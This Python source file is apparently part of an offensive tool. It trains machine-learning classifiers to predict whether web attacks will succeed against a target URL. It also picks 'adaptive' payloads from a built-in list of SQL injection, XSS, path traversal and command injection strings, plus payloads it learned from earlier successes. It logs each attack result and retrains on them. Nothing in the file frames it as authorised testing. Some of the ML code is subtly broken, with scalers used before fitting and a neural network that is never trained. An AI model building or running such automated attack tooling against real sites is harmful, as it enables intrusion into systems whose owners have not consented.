"""
DEVELOPMENTAL SILO - AI/ML Core System
Machine Learning and Intelligence Engine
"""

import numpy as np
import pandas as pd
import joblib
import pickle
import json
import time
import random
import hashlib
import logging
from typing import Dict, List, Any, Optional
from datetime import datetime
from dataclasses import dataclass
from enum import Enum
import requests
import asyncio
import aiohttp

# ML Libraries
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.neural_network import MLPClassifier
from sklearn.preprocessing import StandardScaler
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score
# Try to import TensorFlow
try:
    import tensorflow as tf
    from tensorflow import keras
    TENSORFLOW_AVAILABLE = True
except ImportError:
    TENSORFLOW_AVAILABLE = False

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class AttackType(Enum):
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    LFI_RFI = "lfi_rfi"
    COMMAND_INJECTION = "command_injection"
    API_ABUSE = "api_abuse"


@dataclass
class AttackResult:
    attack_type: AttackType
    target: str
    payload: str
    success: bool
    response_code: int
    response_time: float
    confidence_score: float = 0.0
    timestamp: datetime = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()


class AICore:
    """AI/ML Core Engine for Learning and Adaptation"""
    
    def __init__(self, model_path: str = "models/ai_core.pkl"):
        self.model_path = model_path
        self.models = {}
        self.scalers = {}
        self.attack_history = []
        self.success_patterns = {}
        self.failure_patterns = {}
        
        # Initialize models
        self._initialize_models()
        logger.info("AI Core initialized")
    
    def _initialize_models(self):
        """Initialize ML models"""
        for attack_type in AttackType:
            self.models[f"{attack_type.value}_rf"] = RandomForestClassifier(n_estimators=100, random_state=42)
            self.models[f"{attack_type.value}_gb"] = GradientBoostingClassifier(n_estimators=100, random_state=42)
            
            # Add deep learning models if TensorFlow is available
            if TENSORFLOW_AVAILABLE:
                self.models[f"{attack_type.value}_nn"] = self._create_neural_network()
            
            self.scalers[attack_type.value] = StandardScaler()
    
    def extract_features(self, target: str, payload: str, response: requests.Response) -> np.ndarray:
        """Extract features for ML"""
        features = [
            len(target), target.count('.'), target.count('/'), target.count('?'),
            len(payload), payload.count("'"), payload.count('"'), payload.count(';'),
            response.status_code, len(response.text), response.elapsed.total_seconds(),
            response.text.count('error'), response.text.count('success')
        ]
        
        # Pad to 50 features
        while len(features) < 50:
            features.append(0)
        
        return np.array(features[:50])
    
    def predict_success(self, target: str, payload: str, attack_type: AttackType) -> float:
        """Predict attack success probability"""
        try:
            response = requests.get(target, timeout=5)
            features = self.extract_features(target, payload, response)
            
            scaler = self.scalers.get(attack_type.value)
            if scaler:
                features_scaled = scaler.transform(features.reshape(1, -1))
            else:
                features_scaled = features.reshape(1, -1)
            
            predictions = []
            rf_model = self.models.get(f"{attack_type.value}_rf")
            gb_model = self.models.get(f"{attack_type.value}_gb")
            
            if rf_model:
                pred = rf_model.predict_proba(features_scaled)[0][1]
                predictions.append(pred)
            
            if gb_model:
                pred = gb_model.predict_proba(features_scaled)[0][1]
                predictions.append(pred)
            
            # Add neural network prediction if available
            nn_model = self.models.get(f"{attack_type.value}_nn")
            if nn_model and TENSORFLOW_AVAILABLE:
                try:
                    pred = nn_model.predict(features_scaled, verbose=0)[0][0]
                    predictions.append(pred)
                except Exception as e:
                    logger.debug(f"Neural network prediction failed: {e}")
            
            return np.mean(predictions) if predictions else 0.5
            
        except Exception as e:
            logger.error(f"Prediction error: {e}")
            return 0.5
    
    def generate_adaptive_payload(self, target: str, attack_type: AttackType, previous_failures: List[str]) -> str:
        """Generate adaptive payload based on learning"""
        base_payloads = {
            AttackType.SQL_INJECTION: ["' OR '1'='1", "' UNION SELECT NULL--", "admin'--"],
            AttackType.XSS: ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
            AttackType.LFI_RFI: ["../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
            AttackType.COMMAND_INJECTION: ["; ls", "| whoami", "& dir"],
            AttackType.API_ABUSE: ["admin", "test", "debug", "api"]
        }
        
        payloads = base_payloads.get(attack_type, [])
        
        # Add learned patterns
        bypass_techniques = self.success_patterns.get(attack_type.value, [])
        for technique in bypass_techniques:
            payloads.append(technique)
        
        # Remove failed payloads
        payloads = [p for p in payloads if p not in previous_failures]
        
        return random.choice(payloads) if payloads else ""
    
    def learn_from_result(self, result: AttackResult):
        """Learn from attack result"""
        self.attack_history.append(result)
        
        if result.success:
            if result.attack_type.value not in self.success_patterns:
                self.success_patterns[result.attack_type.value] = []
            self.success_patterns[result.attack_type.value].append(result.payload)
        else:
            if result.attack_type.value not in self.failure_patterns:
                self.failure_patterns[result.attack_type.value] = []
            self.failure_patterns[result.attack_type.value].append(result.payload)
        
        # Retrain models every 10 attacks
        if len(self.attack_history) % 10 == 0:
            self._retrain_models()
    
    def _retrain_models(self):
        """Retrain ML models"""
        try:
            X = []
            y = []
            
            for result in self.attack_history:
                try:
                    response = requests.get(result.target, timeout=5)
                    features = self.extract_features(result.target, result.payload, response)
                    X.append(features)
                    y.append(1 if result.success else 0)
                except:
                    continue
            
            if len(X) < 5:
                return
            
            X = np.array(X)
            y = np.array(y)
            
            X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
            
            for attack_type in AttackType:
                scaler = self.scalers[attack_type.value]
                X_train_scaled = scaler.fit_transform(X_train)
                
                rf_model = self.models[f"{attack_type.value}_rf"]
                gb_model = self.models[f"{attack_type.value}_gb"]
                
                rf_model.fit(X_train_scaled, y_train)
                gb_model.fit(X_train_scaled, y_train)
            
            self._save_models()
            logger.info("Models retrained successfully")
            
        except Exception as e:
                               logger.error(f"Retraining error: {e}")
    
    def _create_neural_network(self):
        """Create a neural network model"""
        if not TENSORFLOW_AVAILABLE:
            return None
        
        try:
            model = keras.Sequential([
                keras.layers.Dense(64, activation='relu', input_shape=(50,)),
                keras.layers.Dropout(0.2),
                keras.layers.Dense(32, activation='relu'),
                keras.layers.Dropout(0.2),
                keras.layers.Dense(16, activation='relu'),
                keras.layers.Dense(1, activation='sigmoid')
            ])
            
            model.compile(
                optimizer='adam',
                loss='binary_crossentropy',
                metrics=['accuracy']
            )
            
            return model
        except Exception as e:
            logger.error(f"Error creating neural network: {e}")
            return None
    
    def _save_models(self):
        """Save trained models"""
        try:
            save_data = {
                'models': self.models,
                'scalers': self.scalers,
                'history': self.attack_history,
                'success_patterns': self.success_patterns,
                'failure_patterns': self.failure_patterns
            }
            
            with open(self.model_path, 'wb') as f:
                pickle.dump(save_data, f)
            
        except Exception as e:
            logger.error(f"Save error: {e}")
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get AI performance statistics"""
        if not self.attack_history:
            return {"message": "No data available"}
        
        total = len(self.attack_history)
        successful = len([r for r in self.attack_history if r.success])
        
        return {
            "total_attacks": total,
            "successful_attacks": successful,
            "success_rate": successful / total if total > 0 else 0,
            "patterns_learned": sum(len(v) for v in self.success_patterns.values()),
            "models_trained": len(self.models)
        } 